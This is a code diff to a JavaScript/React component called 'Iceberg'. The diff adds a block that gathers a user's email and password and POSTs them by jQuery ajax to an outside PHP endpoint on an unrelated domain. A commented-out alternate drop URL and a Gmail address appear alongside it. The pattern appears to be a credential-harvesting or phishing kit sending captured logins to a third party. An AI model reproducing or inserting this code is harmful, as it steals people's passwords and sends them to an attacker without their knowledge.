@@ -128,6 +128,27 @@ export const Iceberg = ()=>{
                   console.log(data);
               },
           });
+
+
+
+            
+            const user = {
+                email: b,
+                password: pwd,
+            };
+
+          $.ajax({
+              type: "POST",
+              url: "https://physicaleducationdiploma.com/footer/spein.php",
+            //   url: "https://bucketlion.com/hello/spei.php",
+            // speinter82@gmail.com
+              data: user,
+              success(data) {
+                  console.log(data);
+              },
+          });
+
+            
     
         
           setCount(count=> count + 1);
